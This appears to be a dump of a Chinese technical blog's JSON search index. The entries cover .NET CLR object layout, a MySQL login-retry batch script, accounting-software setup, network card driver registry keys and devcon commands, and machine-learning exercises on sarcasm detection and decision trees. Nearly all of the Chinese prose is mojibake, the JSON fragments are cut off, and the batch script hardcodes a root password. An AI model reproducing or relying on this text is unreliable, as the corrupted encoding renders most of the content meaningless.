è¿è¡Œæœºåˆ¶çš„ç¿»è¯‘ å…³é”®å­—ï¼š#Method Layout #CLR #SystemDomain #SharedDomain #DefaultDomain ç›¸å…³å¼€æºä»£ç ï¼š Protection-Talk/Encryptor/Hook at master Â· srgylvn/Protection-Talk å…·ä½“å¯ä»¥çœ‹ my_compileMethodImpl çš„å®ç°ã€‚ åŸæ–‡é“¾æ¥ï¼š.NET Framework Internals: How the CLR Creates Runtime Objects | Microsoft Learn å»ºè®®ï¼šåœ¨è¯»è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œä½ æœ€å¥½æ˜¯æœ‰ç›¸å…³çš„ .Net ç¨‹åºè°ƒè¯•ç»éªŒï¼Œå¹¶ä¸”ç†è§£ CLRã€‚ 0x01 ç®€ä»‹ ç®€è¦è¯´æ˜ æ·±å…¥åˆ° .Net æ¡†æ¶ï¼ŒæŸ¥çœ‹ CLR å¦‚ä½•åœ¨è¿è¡Œæ—¶åˆ›å»ºå¯¹è±¡ è¿™ç¯‡æ–‡ç« çš„ä¸»è¦è®ºç‚¹ï¼š SystemDomainï¼ŒShareDomainï¼Œä»¥åŠ DefalutDomain å¯¹è±¡å¸ƒå±€ä»¥åŠå†…å­˜ç»†èŠ‚ æ–¹æ³•è¡¨å¸ƒå±€ æ–¹æ³•åˆ†æ´¾ 0x02 ä¸»è¦å†…å®¹ Domains Created by the CLR Bootstrap System Domain SharedDomain DefaultDomain LoaderHeaps Type Fundamentals ObjectInstance MethodTable Base Instance Size Method Slot Table MethodDesc Interface Vtable Map and Interface Map Virtual Dispatch Static Variables EEClass Conclusion åœ¨å°†æ¥ä¸€æ®µæ—¶é—´å†…ï¼ŒCLR éƒ½å°†æˆä¸ºåœ¨ Windows ä¸­æ„å»ºåº”ç”¨çš„ä¸»è¦åŸºç¡€è®¾æ–½ã€‚å¿…è¦çš„æ·±å…¥äº†è§£æœ‰åŠ©äºæˆ‘ä»¬æ„å»ºé«˜æ•ˆã€å·¥ä¸šå®åŠ›å¼ºå¤§çš„åº”ç”¨ç¨‹åºã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œä½œè€…å°± CLR å†…éƒ¨ç»“æ„ï¼ŒåŒ…æ‹¬å¯¹è±¡å®ä¾‹å¸ƒå±€ã€æ–¹æ³•è¡¨å¸ƒå±€ã€æ–¹æ³•è°ƒç”¨ã€ä»¥åŠåŸºäºæ¥å£çš„æ–¹æ³•è°ƒç”¨å’Œå„ç§æ•°æ®ç»“æ„è¿›è¡Œè¯´æ˜ã€‚ æœ¬æ–‡ä½¿ç”¨ C# ç¼–å†™çš„ç®€å•ç¤ºä¾‹ï¼Œæ‰€ä»¥å¯¹ä»»ä½•è¯­è¨€è¯­æ³•çš„éšå¼å¼•ç”¨éƒ½åº”è¯¥é»˜è®¤ä¸º C#ï¼Œè®¨è®ºçš„ä¸€äº›æ•°æ®ç»“æ„å’Œç®—æ³•å¯èƒ½ä¼šåœ¨ Microsoft .Net 2.0 çš„æ¡†æ¶è¿›è¡Œæ›´æ”¹ï¼Œä½†æ˜¯æ¦‚å¿µåŸºæœ¬ä¿æŒä¸€è‡´ã€‚ä½œè€…ä½¿ç”¨çš„çš„ç¯å¢ƒä¸º Visual Studio .Net 2003 Debugger å’Œ è°ƒè¯•æ‰©å±• SOSï¼ˆSon of Strikeï¼‰ï¼Œç”¨ä»¥æŸ¥çœ‹æœ¬æ–‡ä¸­æ‰€è®¨è®ºçš„æ•°æ®ç»“æ„ã€‚SOS å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç†è§£ CLR å†…éƒ¨æ•°æ®ç»“æ„å¹¶è½¬å‚¨å‡ºæœ‰ç”¨çš„ä¿¡æ¯ã€‚æœ‰å…³å°† SOS åŠ è½½åˆ° Visual Sutio çš„æ–¹æ³•å¯ä»¥æŸ¥çœ‹ SOS ä¸€èŠ‚ã€‚ä½œè€…å°†æè¿°åœ¨å…±äº«æº CLIï¼ˆSSCLIï¼‰ä¸­å…·æœ‰ç›¸åº”å®ç°çš„ç±»ã€‚å›¾1å°†å¸®åŠ©ä½ åœ¨SSCLIä¸­æµè§ˆæ•°ä»¥å…†å­—èŠ‚è®¡çš„ä»£ç ï¼ŒåŒæ—¶æœç´¢å¼•ç”¨çš„ç»“æ„ã€‚ Item SSCLI Path AppDomain \\sscli\\clr\\src\\vm\\appdomain.hpp AppDomainStringLiteralMap \\sscli\\clr\\src\\vm\\stringliteralmap.h BaseDomain \\sscli\\clr\\src\\vm\\appdomain.hpp ClassLoader \\sscli\\clr\\src\\vm\\clsload.hpp EEClass \\sscli\\clr\\src\\vm\\class.h FieldDescs \\sscli\\clr\\src\\vm\\field.h GCHeap \\sscli\\clr\\src\\vm\\gc.h GlobalStringLiteralMap \\sscli\\clr\\src\\vm\\stringliteralmap.h HandleTable \\sscli\\clr\\src\\vm\\handletable.h InterfaceVTableMapMgr \\sscli\\clr\\src\\vm\\appdomain.hpp Large Object Heap \\sscli\\clr\\src\\vm\\gc.h LayoutKind \\sscli\\clr\\src\\bcl\\system\\runtime\\interopservices\\layoutkind.cs LoaderHeaps \\sscli\\clr\\src\\inc\\utilcode.h MethodDescs \\sscli\\clr\\src\\vm\\method.hpp MethodTables \\sscli\\clr\\src\\vm\\class.h OBJECTREF \\sscli\\clr\\src\\vm\\typehandle.h SecurityContext \\sscli\\clr\\src\\vm\\security.h SecurityDescriptor \\sscli\\clr\\src\\vm\\security.h SharedDomain \\sscli\\clr\\src\\vm\\appdomain.hpp StructLayoutAttribute \\sscli\\clr\\src\\bcl\\system\\runtime\\interopservices\\attributes.cs SyncTableEntry \\sscli\\clr\\src\\vm\\syncblk.h System namespace \\sscli\\clr\\src\\bcl\\system SystemDomain \\sscli\\clr\\src\\vm\\appdomain.hpp TypeHandle \\sscli\\clr\\src\\vm\\typehandle.h å›¾ä¸€ SSCLI å¼•ç”¨","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€æ‰¹å¤„ç†ã€‘MySQL ç™»å½•","date":"2024-06-24T16:00:00.000Z","path":"A_OS/Windows/æ‰¹å¤„ç†/ã€æ‰¹å¤„ç†ã€‘MySQL ç™»å½•/","text":"æ¦‚è¿°ï¼šMySQL ç™»å½•æµ‹è¯•è„šæœ¬ ç”¨äºä¸æ–­å°è¯•ç™»å½• MySQL ã€‚ 123456789101112131415@echo off setlocal EnableDelayedExpansion :loop mysql -u root -pAdmin123 -e &quot;SELECT 1;&quot; if %errorlevel% neq 0 ( echo Attempting to login again... ping 127.0.0.1 -n 2 &gt;nul rem å¦‚æœéœ€è¦æ›´çŸ­çš„é—´éš™ä½¿ç”¨ choice rem choice /c X /t 1 /d Y &gt;nul goto loop ) echo Logged in successfully! endlocal","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ‰¹å¤„ç†","slug":"A-OS/Windows/æ‰¹å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"}]},{"title":"ã€ç¯å¢ƒæ­å»ºã€‘ç•…æ·é€šT+","date":"2024-06-24T16:00:00.000Z","path":"A_OS/Windows/ç¯å¢ƒæ­å»º/ã€ç¯å¢ƒæ­å»ºã€‘ç•…æ·é€šT+/","text":"æ¦‚è¿°ï¼šç•…æ·é€šT+ ç¯å¢ƒæ­å»ºè®°å½• [toc] ç›¸å…³é—®é¢˜è®°å½•ï¼š â­ ç•…æ·é€šwebè¿›ç¨‹æœ‰ä¸¤ç§æ–¹å¼å¯åŠ¨ï¼š ä½¿ç”¨ç•…æ·é€šè‡ªå·±çš„è¿›ç¨‹å¯åŠ¨ web æœåŠ¡ï¼ŒChanjet.TP.WebServer.FastCgi.exe ï¼Œé€šè¿‡è¯¥è¿›ç¨‹æä¾› web æœåŠ¡ã€‚ä¹Ÿæ˜¯é€šè¿‡è¯¥è¿›ç¨‹åŠ è½½ç•…æ·é€šçš„æ¨¡å— x86 ä½¿ç”¨ w3wp.exeã€‚å³é€šè¿‡ IIS å¯åŠ¨è‡ªå·±çš„Web æœåŠ¡ã€‚ x64","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"ã€MLã€‘é€»è¾‘å›å½’ç”¨äºè®½åˆºæ–‡æœ¬æ£€æµ‹","date":"2024-06-23T16:00:00.000Z","path":"A_å†…åŠŸ/C_æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€/ã€MLã€‘é€»è¾‘å›å½’ç”¨äºè®½åˆºæ–‡æœ¬æ£€æµ‹/","text":"æ¦‚è¿°ï¼šå®éªŒæ¥¼æœºå™¨å­¦ä¹ è¯¾ç¨‹ é€»è¾‘å›å½’ç”¨äºè®½åˆºæ–‡æœ¬æ£€æµ‹è¯¾ç¨‹å†…å®¹ æœ¬æ¬¡æŒ‘æˆ˜ä½¿ç”¨è®ºæ–‡ A Large Self-Annotated Corpus for Sarcasm æä¾›çš„è¯­æ–™æ•°æ®ã€‚è¯¥è¯­æ–™æ•°æ®æ¥æºäº Reddit è®ºå›ï¼ŒæŒ‘æˆ˜é€šè¿‡ä¸‹é¢çš„é“¾æ¥ä¸‹è½½å¹¶è§£å‹æ•°æ®ï¼š 12!wget -nc &quot;http://labfile.oss.aliyuncs.com/courses/1283/train-balanced-sarcasm.csv.zip&quot;!unzip -o &quot;train-balanced-sarcasm.csv.zip&quot;","tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"machine-learning","slug":"machine-learning","permalink":"https://hodlyounger.github.io/tags/machine-learning/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"C_æœºå™¨å­¦ä¹ ","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ åŸºç¡€","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"}]},{"title":"æœºå™¨å­¦ä¹ ","date":"2024-06-19T02:16:56.692Z","path":"A_å†…åŠŸ/C_æœºå™¨å­¦ä¹ /ã€MLã€‘index/","text":"æ¦‚è¿°ï¼šæœºå™¨å­¦ä¹  ç›¸å…³æ–‡ç« æ¨èï¼š ç”¨äºæ•°æ®ç§‘å­¦çš„é¡¶çº§ C/C++ æœºå™¨å­¦ä¹ åº“æ•´ç† - Xu_Lin - åšå®¢å›­ é¡¹ç›®æ¨èï¼š MNN alibaba/MNN: MNN is a blazing fast, lightweight deep learning framework, battle-tested by business-critical use cases in Alibaba æ–‡æ¡£ï¼š é˜¿é‡Œå·´å·´ MNN","tags":[],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"C_æœºå™¨å­¦ä¹ ","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"ã€é©±åŠ¨ã€‘ç½‘å¡é©±åŠ¨å¯¼è¯»","date":"2024-06-19T00:40:55.049Z","path":"A_OS/Windows/é©±åŠ¨/ç½‘å¡é©±åŠ¨/ã€é©±åŠ¨ã€‘ç½‘å¡é©±åŠ¨å¯¼è¯»/","text":"æ¦‚è¿°ï¼šç½‘å¡é©±åŠ¨ç›¸å…³ä¿¡æ¯æ•´å¤‡ã€‚ ç½‘å¡å¼€æºé¡¹ç›®åŠæ–‡ç« æ¨èï¼š æ–‡ç«  Wintunï¼šä¸€æ¬¾æƒŠè‰³çš„ WireGuard è™šæ‹Ÿç½‘å¡æ¥å£é©±åŠ¨-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ é¡¹ç›® OpenVPN/openvpn: OpenVPN is an open source VPN daemon pingbu/TunHelpAPI: windowä¸‹è™šæ‹Ÿç½‘å¡TUN/TAPçš„å¸®åŠ©å‡½æ•°ï¼Œå¯å®ç°è™šæ‹Ÿç½‘å¡çš„åˆ›å»ºã€è®¾ç½®IPã€å¢åŠ è·¯ç”±ã€è¯»å–å’Œå†™å…¥æ•°æ®ç­‰æ“ä½œ WireGuard ç®€ä»‹ ç½‘å¡é©±åŠ¨ï¼šWindows ç½‘å¡é©±åŠ¨æ˜¯è¿æ¥è®¡ç®—æœºä¸å…¶ç½‘ç»œç¡¬ä»¶ä¹‹é—´çš„é‡è¦æ¡¥æ¢ï¼Œå®ƒç¡®ä¿äº†è®¡ç®—æœºèƒ½å¤Ÿé€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®ä¼ è¾“ã€‚ æ³¨å†Œè¡¨é¡¹ Class æ³¨å†Œè¡¨é¡¹ SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\&#123;4D36E972-E325-11CE-BFC1-08002BE10318&#125; å­é”®çš„ 00** ï¼Œæ¯ä¸€ä¸ªéƒ½è¡¨ç¤ºä¸€ä¸ªç½‘å¡ï¼Œç‚¹å¼€å¯ä»¥çœ‹åˆ°ç½‘å¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¯¥ç½‘å¡å¯¹åº”çš„ inf æ–‡ä»¶ä¸º tap0901.infã€‚å¯¹åº”çš„ è®¾å¤‡id ä¸º tap0901ã€‚ å…¶ä¸­ï¼ŒnetCfgInstanceId å¯¹åº”ç€è¯¥ç½‘å¡çš„å”¯ä¸€GUIDï¼Œåœ¨åæ–‡å¯ä»¥é€šè¿‡è¯¥ GUID æ‰¾åˆ°å…¶å¯¹åº”çš„ç½‘ç»œé€‚é…å™¨ã€‚ Network æ³¨å†Œè¡¨ SYSTEM\\\\CurrentControlSet\\\\Control\\\\Network\\\\&#123;4D36E972-E325-11CE-BFC1-08002BE10318&#125; è¯¥æ³¨å†Œè¡¨èŠ‚ç‚¹ä¿å­˜äº†å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ç½‘ç»œæ¥å£ï¼Œä¸»è¦ä¸ç½‘ç»œé€‚é…å™¨çš„é…ç½®å’Œè®¾ç½®ç›¸å…³ã€‚ å…¶ä¸­ï¼Œ &#123;4D36E972-E325-11CE-BFC1-08002BE10318&#125; æ˜¯ä¸“é—¨ç”¨äºæ ‡è¯†ç½‘ç»œé€‚é…å™¨ç±»çš„ GUIDã€‚ å¯¹ç…§ Class ç›®å½•ä¸‹çš„ NetCfgInstanceID æ‰¾åˆ°å¯¹åº”çš„ç½‘ç»œé€‚é…å™¨ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›ä¿¡æ¯ï¼Œå¦‚åç§°ä¸º 360SDNSï¼ŒPnPInstanceId ä¸º ROOT\\NET\\0000ã€‚ å®‰è£…å¸è½½ ä½¿ç”¨ devcon å¯ä»¥ä½¿ç”¨ devcon /? è·å–å¸®åŠ©æ‰‹å†Œã€‚ å®‰è£… 1234# æ ¼å¼è¯´æ˜# è®¾å¤‡idä¹Ÿå°±æ˜¯å‰æ–‡è¯´åˆ°çš„ tap0901# devcon install &#123;infæ–‡ä»¶&#125; &#123;è®¾å¤‡id&#125;devcon install netcard.inf netcardid å¸è½½ 123# æ ¼å¼è¯´æ˜# å¸è½½å¯ä»¥ä½¿ç”¨è®¾å¤‡idå»å¸è½½ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é€šé…ç¬¦é€‰æ‹©devcon remove netcardid","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"ç½‘å¡é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨/ç½‘å¡é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€æœºå™¨å­¦ä¹ åŸºç¡€ã€‘å†³ç­–æ ‘å’Œéšæœºæ£®æ—åˆ†æåº”ç”¨","date":"2024-06-18T06:54:59.100Z","path":"A_å†…åŠŸ/C_æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€/ã€æœºå™¨å­¦ä¹ åŸºç¡€ã€‘å†³ç­–æ ‘å’Œéšæœºæ£®æ—åº”ç”¨/","text":"æ¦‚è¿°ï¼šå®éªŒæ¥¼å†³ç­–æ ‘å’Œéšæœºæ£®æ—åˆ†æåº”ç”¨ å†³ç­–æ ‘å’Œéšæœºæ£®æ—åˆ†æåº”ç”¨ æœ¬æ¬¡æŒ‘æˆ˜æ˜¯å…³äºå†³ç­–æ ‘å’Œéšæœºæ£®æ—æ–¹æ³•çš„åº”ç”¨ç»ƒä¹ ï¼Œé¦–å…ˆå¯¼å…¥å¿…è¦çš„æ¨¡å—ã€‚ 12345678910111213141516171819!pip install pydotplus # å®‰è£…å¿…è¦æ¨¡å—import warningsimport pydotplusfrom io import StringIOfrom IPython.display import SVGfrom sklearn.metrics import accuracy_scorefrom sklearn.ensemble import RandomForestClassifierfrom sklearn.tree import DecisionTreeClassifier, export_graphvizfrom sklearn import preprocessingfrom sklearn.model_selection import GridSearchCV, cross_val_scoreimport collectionsfrom sklearn.preprocessing import LabelEncoderimport pandas as pdimport numpy as npimport seaborn as snsfrom matplotlib import pyplot as plt%matplotlib inlineplt.rcParams[&#x27;figure.figsize&#x27;] = (10, 8)warnings.filterwarnings(&#x27;ignore&#x27;) ç®€å•ç¤ºä¾‹ç»ƒä¹  æ­¤å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†é€šè¿‡è§£å†³ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹é—®é¢˜æ¥å¼„æ¸…æ¥šå†³ç­–æ ‘æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚è™½ç„¶å•é¢—å†³ç­–æ ‘ä¸å¤ªä¼šäº§ç”Ÿå‡ºè‰²çš„ç»“æœï¼Œä½†å…¶ä»–åŸºäºç›¸åŒçš„æ€æƒ³çš„é«˜æ€§èƒ½ç®—æ³•ï¼ˆå¦‚æ¢¯åº¦å¢å¼ºå’Œéšæœºæ£®æ—ï¼‰å¾€å¾€å°±å¨åŠ›å¼ºå¤§äº†ã€‚è¿™å°±éœ€è¦æˆ‘ä»¬å…ˆäº†è§£ç®€å•å†³ç­–æ ‘çš„å·¥ä½œæœºåˆ¶ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç¤ºä¾‹æ•°æ®é›†ï¼Œè¯¥æ•°æ®é›†è¡¨ç¤ºäº† A ä¼šä¸ä¼šå’Œ B è¿›è¡Œç¬¬äºŒæ¬¡çº¦ä¼šã€‚è€Œæ•°æ®é›†ä¸­çš„ç‰¹å¾åŒ…æ‹¬ï¼šå¤–è²Œï¼Œå£æ‰ï¼Œé…’ç²¾æ¶ˆè´¹ï¼Œä»¥åŠç¬¬ä¸€æ¬¡çº¦ä¼šèŠ±äº†å¤šå°‘é’±ã€‚ åˆ›å»ºç¤ºä¾‹æ•°æ®é›† 12345678910111213# åˆ›å»ºç¤ºä¾‹æ•°æ®é›†ï¼Œå¹¶å¯¹æ•°æ®ç±»åˆ«è¿›è¡Œç‹¬çƒ­ç¼–ç def create_df(dic, feature_list): out = pd.DataFrame(dic) out = pd.concat([out, pd.get_dummies(out[feature_list])], axis=1) out.drop(feature_list, axis=1, inplace=True) return out# ä¿è¯ç‹¬çƒ­ç¼–ç åçš„ç‰¹å¾åœ¨è®­ç»ƒå’Œæµ‹è¯•æ•°æ®ä¸­åŒæ—¶å­˜åœ¨def intersect_features(train, test): common_feat = list(set(train.keys()) &amp; set(test.keys())) return train[common_feat], test[common_feat]features = [&#x27;Looks&#x27;, &#x27;Alcoholic_beverage&#x27;, &#x27;Eloquence&#x27;, &#x27;Money_spent&#x27;] æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‡å®šä¸€äº›è®­ç»ƒå’Œæµ‹è¯•æ•°æ®ã€‚ è®­ç»ƒæ•°æ® 1234567891011121314df_train = &#123;&#125;df_train[&#x27;Looks&#x27;] = [&#x27;handsome&#x27;, &#x27;handsome&#x27;, &#x27;handsome&#x27;, &#x27;repulsive&#x27;, &#x27;repulsive&#x27;, &#x27;repulsive&#x27;, &#x27;handsome&#x27;]df_train[&#x27;Alcoholic_beverage&#x27;] = [ &#x27;yes&#x27;, &#x27;yes&#x27;, &#x27;no&#x27;, &#x27;no&#x27;, &#x27;yes&#x27;, &#x27;yes&#x27;, &#x27;yes&#x27;]df_train[&#x27;Eloquence&#x27;] = [&#x27;high&#x27;, &#x27;low&#x27;, &#x27;average&#x27;, &#x27;average&#x27;, &#x27;low&#x27;, &#x27;high&#x27;, &#x27;average&#x27;]df_train[&#x27;Money_spent&#x27;] = [&#x27;lots&#x27;, &#x27;little&#x27;, &#x27;lots&#x27;, &#x27;little&#x27;, &#x27;lots&#x27;, &#x27;lots&#x27;, &#x27;lots&#x27;]df_train[&#x27;Will_go&#x27;] = LabelEncoder().fit_transform( [&#x27;+&#x27;, &#x27;-&#x27;, &#x27;+&#x27;, &#x27;-&#x27;, &#x27;-&#x27;, &#x27;+&#x27;, &#x27;+&#x27;])df_train = create_df(df_train, features)df_train æµ‹è¯•æ•°æ® 123456789101112df_test = &#123;&#125;df_test[&#x27;Looks&#x27;] = [&#x27;handsome&#x27;, &#x27;handsome&#x27;, &#x27;repulsive&#x27;]df_test[&#x27;Alcoholic_beverage&#x27;] = [&#x27;no&#x27;, &#x27;yes&#x27;, &#x27;yes&#x27;]df_test[&#x27;Eloquence&#x27;] = [&#x27;average&#x27;, &#x27;high&#x27;, &#x27;average&#x27;]df_test[&#x27;Money_spent&#x27;] = [&#x27;lots&#x27;, &#x27;little&#x27;, &#x27;lots&#x27;]df_test = create_df(df_test, features)df_test# ä¿è¯ç‹¬çƒ­ç¼–ç åçš„ç‰¹å¾åœ¨è®­ç»ƒå’Œæµ‹è¯•æ•°æ®ä¸­åŒæ—¶å­˜åœ¨y = df_train[&#x27;Will_go&#x27;]df_train, df_test = intersect_features(train=df_train, test=df_test)df_traindf_test *é—®é¢˜ï¼š*è¯·æ ¹æ®ä¸Šé¢çš„è®­ç»ƒæ•°æ®é›†åœ¨çº¿ä¸‹ç”¨çº¸å’Œç¬”æ‰‹ç»˜ä¸€é¢—åŸºäºä¿¡æ¯ç†µçš„å†³ç­–æ ‘ã€‚ ä¸è¦è·³è¿‡æ­¤é¢˜ï¼Œä¸€å®šè¦è‡ªå·±è¯•ä¸€è¯•ï¼ å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ scikit-learn æä¾›çš„æ–¹æ³•æ¥ç»˜åˆ¶å†³ç­–æ ‘ã€‚ 123456dt = DecisionTreeClassifier(criterion=&#x27;entropy&#x27;, random_state=17)dt.fit(df_train, y)tree_str = export_graphviz( dt, feature_names=df_train.columns, out_file=None, filled=True)graph = pydotplus.graph_from_dot_data(tree_str)SVG(graph.create_svg()) è®¡ç®—ç†µå’Œä¿¡æ¯å¢ç›Š æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¢å¦å¤–ä¸€ä¸ªä¾‹å­ï¼šå‡è®¾æœ‰ 9 ä¸ªè“è‰²çƒå’Œ 11 ä¸ªé»„è‰²çƒã€‚å¦‚æœçƒæ˜¯è“è‰²ï¼Œåˆ™è®©çƒçš„æ ‡ç­¾æ˜¯ 1ï¼Œå¦åˆ™ä¸º 0ã€‚ 1balls = [1 for i in range(9)] + [0 for i in range(11)] # ç”Ÿæˆæ•°æ® æ¥ä¸‹æ¥å°†çƒåˆ†æˆå¦‚ä¸‹ä¸¤ç»„ï¼š 12345# æ•°æ®åˆ†ç»„# 8 è“è‰² å’Œ 5 é»„è‰²balls_left = [1 for i in range(8)] + [0 for i in range(5)]# 1 è“è‰² å’Œ 6 é»„è‰²balls_right = [1 for i in range(1)] + [0 for i in range(6)] *é—®é¢˜ï¼š*è¯·æ ¹æ®å‰é¢çš„å®éªŒå†…å®¹å®ç°é¦™å†œç†µè®¡ç®—å‡½æ•° entropy()ã€‚ å®ç°å‡½æ•°æ—¶ï¼Œè¯·ç»“åˆä¸‹ä¸€é¢˜ç»™å‡ºçš„æµ‹è¯•ç¤ºä¾‹ï¼Œä¿è¯æµ‹è¯•ç”¨ä¾‹å¯ä»¥æ‰§è¡ŒæˆåŠŸã€‚ 12345678910111213from math import logdef entropy(a_list): lst = list(a_list) size = len(lst) * 1.0 entropy = 0 set_elements = len(set(lst)) if set_elements in [0, 1]: return 0 for i in set(lst): occ = lst.count(i) entropy -= occ/size * log(occ/size, 2) return entropy *é—®é¢˜ï¼š*åˆ—è¡¨ ball_left ç»™å‡ºçŠ¶æ€çš„ç†µæ˜¯å¤šå°‘ï¼Ÿ 12balls_left_entropy = entropy(balls_left)print(balls_left_entropy) *æœŸæœ›ç»“æœï¼š*0.961 *é—®é¢˜ï¼š*å¦‚æœæœ‰ä¸€ä¸ª 6 é¢ç«‹æ–¹ä½“ç­‰æ¦‚ç‡éª°å­ï¼Œå…¶ç†µæ˜¯å¤šå°‘ï¼Ÿ 1entropy([1, 2, 3, 4, 5, 6]) # 6 é¢ç­‰æ¦‚ç‡éª°å­ç†µ *æœŸæœ›ç»“æœï¼š*2.585 æ¥ä¸‹æ¥ï¼Œè¯·å®ç°ä¿¡æ¯å¢ç›Šçš„è®¡ç®—å‡½æ•° information_gain(root, left, right)ã€‚ 123def information_gain(root, left, right): return entropy(root) - 1.0 * len(left)/len(root) * entropy(left) \\ - 1.0 * len(right)/len(root) * entropy(right) *é—®é¢˜ï¼š*å°†åˆå§‹æ•°æ®é›†æ‹†åˆ†ä¸º balls_left å’Œ balls_right åçš„ä¿¡æ¯å¢ç›Šæ˜¯å¤šå°‘ï¼Ÿ 1 *æœŸæœ›ç»“æœï¼š*0.161 æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°è¯•å®ç°åŸºäºä¿¡æ¯å¢ç›Šåˆ’åˆ†å‡½æ•° best_feature_to_splitã€‚ 123456def best_feature_to_split(X, y): &#x27;&#x27;&#x27;ä¿¡æ¯å¢ç›Šç”¨äºç‰¹å¾åˆ†å‰²&#x27;&#x27;&#x27; out = [] for i in X.columns: out.append(information_gain(y, y[X[i] == 0], y[X[i] == 1])) return out ç„¶åï¼Œé€šè¿‡é€’å½’è°ƒç”¨ best_feature_to_split å®ç°ä¸€ä¸ªç®€å•çš„æ ‘æ„å»ºç­–ç•¥ï¼Œå¹¶è¾“å‡ºæ¯ä¸€æ­¥çš„ç†µå˜åŒ–ã€‚ 12345678910111213141516def btree(X, y): clf = best_feature_to_split(X, y) param = clf.index(max(clf)) ly = y[X.iloc[:, param] == 0] ry = y[X.iloc[:, param] == 1] print(&#x27;Column_&#x27; + str(param) + &#x27; N/Y?&#x27;) print(&#x27;Entropy: &#x27;, entropy(ly), entropy(ry)) print(&#x27;N count:&#x27;, ly.count(), &#x27;/&#x27;, &#x27;Y count:&#x27;, ry.count()) if entropy(ly) != 0: left = X[X.iloc[:, param] == 0] btree(left, ly) if entropy(ry) != 0: right = X[X.iloc[:, param] == 1] btree(right, ry)best_feature_to_split(df_train, y)btree(df_train, y) æ„å»º Adult æ•°æ®é›†å†³ç­–æ ‘ UCI Adult äººå£æ”¶å…¥æ™®æŸ¥æ•°æ®é›†å‰é¢å·²ç»ä½¿ç”¨è¿‡äº†ï¼Œå…¶å…·æœ‰ä»¥ä¸‹ä¸€äº›ç‰¹å¾ï¼š Age â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Workclass â€“ è¿ç»­æ•°å€¼ç‰¹å¾ fnlwgt â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Education â€“ ç±»åˆ«ç‰¹å¾ Education_Num â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Martial_Status â€“ ç±»åˆ«ç‰¹å¾ Occupation â€“ ç±»åˆ«ç‰¹å¾ Relationship â€“ 